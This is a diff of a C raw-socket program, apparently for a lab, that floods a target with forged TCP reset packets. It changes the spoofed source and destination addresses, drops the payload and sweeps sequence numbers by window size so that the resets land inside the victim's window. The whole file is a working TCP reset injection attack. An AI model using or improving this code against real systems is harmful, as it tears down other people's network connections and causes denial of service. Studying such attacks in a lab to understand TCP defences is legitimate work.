@@ -13,7 +13,7 @@
 
 #define DATAGRAMSIZE 1024 // number of bytes for raw datagram
 #define PSEUDOPACKETSIZE 1024 // number of bytes for pseudo packet
-#define PAYLOAD ""
+// #define PAYLOAD ""
 
 uint16_t ip_checksum(void* vdata,size_t length) {
     // Cast the data pointer to one that can be indexed.
@@ -63,12 +63,12 @@ int main(int argc, char *argv[])
     struct iphdr *iph;
     struct tcphdr *tcph, *cstcph;
     struct pshdr *psh;
-    char *sIP = "10.0.2.2", *dIP = "10.0.2.15";
+    char *sIP = "10.0.2.15", *dIP = "10.0.2.2";
     uint16_t sport = 35801, dport, port0 = 30000, port_max = USHRT_MAX - 1, win = 8192;
     uint16_t id0 = rand() %(65536);
     uint32_t seq, seq0 = 3842363570, ack0 = 1656549865;
     size_t tcp_len;
-    void *data;
+    // void *data;
 
     if (argc != 3) {
 	    fprintf(stderr,"usage: reset port0 port_max\n");
@@ -98,10 +98,11 @@ int main(int argc, char *argv[])
     memset(datagram, 0, sizeof datagram);
     iph = (struct iphdr *) datagram;
     tcph = (struct tcphdr *) (iph + 1);
-    data = (char *) (tcph + 1);
-    strcpy(data, PAYLOAD);
+    // data = (char *) (tcph + 1);
+    // strcpy(data, PAYLOAD);
 
-    tcp_len = sizeof(struct tcphdr) + strlen(data);
+    // tcp_len = sizeof(struct tcphdr) + strlen(data);
+    tcp_len = sizeof(struct tcphdr);
 
     // pack IP header
     iph -> version = 4; // IPv4
@@ -157,15 +158,15 @@ int main(int argc, char *argv[])
 
     // RST flood loop
     for (dport = port0; dport < port_max; dport++) {
-        for (seq = seq0 ; seq < UINT_MAX - win; seq++) {
+        for (seq = seq0 ; seq < UINT_MAX - win; seq += win) {
 
             dport = rand() % (port_max - port0 + 1) + port0;
             tcph -> dest = htons(dport);
             cstcph -> dest = htons(dport);
-            // tcph -> seq = htonl(seq); // set seq number
-            // cstcph -> seq = htonl(seq); // set seq number in the checksum header
-            tcph -> ack_seq = htonl(seq); // set ack seq number
-            cstcph -> ack_seq = htonl(seq); // set ack seq number in the checksum header
+            tcph -> seq = htonl(seq); // set seq number
+            cstcph -> seq = htonl(seq); // set seq number in the checksum header
+            // tcph -> ack_seq = htonl(seq); // set ack seq number
+            // cstcph -> ack_seq = htonl(seq); // set ack seq number in the checksum header
             tcph -> check = 0; // reset check sum
             cstcph -> check = 0; // reset check sum  
             tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len); // calculate check sum
